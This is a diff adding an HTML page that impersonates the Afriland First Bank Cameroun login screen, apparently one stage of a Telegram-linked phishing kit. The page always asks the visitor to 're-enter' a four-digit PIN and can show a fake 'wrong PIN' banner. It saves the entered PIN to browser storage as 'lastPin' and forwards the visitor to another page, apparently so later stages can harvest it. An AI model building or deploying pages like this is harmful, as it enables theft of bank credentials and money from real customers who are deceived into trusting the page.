@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Afriland First Bank Cameroun - Connexion</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --primary-color: #551a8b; --primary-gradient: linear-gradient(180deg, #6c23af 0%, #551a8b 100%); }
+        body { background-color: #fff; margin: 0; display: flex; flex-direction: column; min-height: 100vh; font-family: -apple-system, sans-serif; }
+        .header-box { width: 100%; background: var(--primary-gradient); padding: 30px 20px 25px; color: white; text-align: center; }
+        .header-title { font-size: 28px; font-weight: 800; margin: 0; display: flex; justify-content: center; gap: 6px; color: #fff; }
+        .header-title .bank { color: #ffd700; }
+        .main-content { width: 90%; max-width: 400px; margin: 25px auto 0; text-align: center; flex-grow: 1; display: flex; flex-direction: column; align-items: center; }
+        .phone-display { width: 100%; border: 1.5px solid var(--primary-color); border-radius: 12px; padding: 14px 16px; display: flex; align-items: center; gap: 12px; margin-bottom: 30px; font-size: 18px; font-weight: 700; }
+        .pin-wrapper { position: relative; width: 100%; display: flex; justify-content: center; margin-bottom: 8px; }
+        .pin-input-group { display: flex; gap: 12px; }
+        .pin-box { width: 52px; height: 52px; border: 1.5px solid var(--primary-color); border-radius: 12px; text-align: center; font-size: 22px; font-weight: bold; outline: none; }
+        .btn-submit { background-color: #e2e2e2; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; text-transform: uppercase; margin-top: 20px; }
+        .btn-submit.active { background-color: var(--primary-color); cursor: pointer; }
+        .footer-box { width: 100%; background: var(--primary-gradient); padding: 35px 20px 20px; color: white; text-align: center; border-top-left-radius: 30px; border-top-right-radius: 30px; margin-top: auto; }
+        .error-banner { background-color: #fde8e8; color: #e74c3c; border: 1px solid #f8b4b4; padding: 12px; border-radius: 8px; margin-bottom: 15px; width: 100%; display: none; font-size: 13px; font-weight: 600; text-align: center; }
+    </style>
+</head>
+<body>
+<div class="header-box">
+    <div class="header-title"><span class="bank">Afriland</span> First Bank</div>
+    <div style="font-size: 14px; margin-top: 6px;">Espace Sécurisé Client</div>
+</div>
+<div class="main-content">
+    <h2>Connexion</h2>
+    
+    <!-- Error banner prompting user to re-enter PIN -->
+    <div id="errorDisplay" class="error-banner"></div>
+
+    <div class="phone-display">
+        <span>🇨🇲</span><span>+237</span>
+        <span id="displayPhone">--</span>
+    </div>
+    <p style="color: #777; font-size: 14px; margin-bottom: 16px;">Veuillez saisir à nouveau votre code PIN</p>
+    
+    <div class="pin-wrapper">
+        <div class="pin-input-group">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        </div>
+    </div>
+    <button id="loginBtn" class="btn-submit" disabled>SE CONNECTER</button>
+</div>
+<div class="footer-box">
+    <div class="header-title"><span class="bank">Afriland</span> First Bank</div>
+</div>
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const loginBtn = document.getElementById('loginBtn');
+    const errorDisplay = document.getElementById('errorDisplay');
+    document.getElementById('displayPhone').textContent = localStorage.getItem('phone') || "699000000";
+
+    // Check if redirected due to wrong PIN
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === 'wrongpin') {
+        errorDisplay.innerText = "❌ Code PIN incorrect. Veuillez le saisir à nouveau.";
+        errorDisplay.style.display = "block";
+    }
+
+    pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, '');
+            if (box.value && index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
+            const filled = [...pinBoxes].every(b => b.value.length === 1);
+            loginBtn.disabled = !filled;
+            loginBtn.classList.toggle('active', filled);
+        });
+
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                pinBoxes[index - 1].focus();
+            }
+        });
+    });
+
+    loginBtn.addEventListener('click', () => {
+        let pin = "";
+        pinBoxes.forEach(b => pin += b.value);
+        localStorage.setItem('lastPin', pin);
+        errorDisplay.style.display = "none";
+        window.location.href = "/page7";
+    });
+});
+</script>
+</body>
+</html>
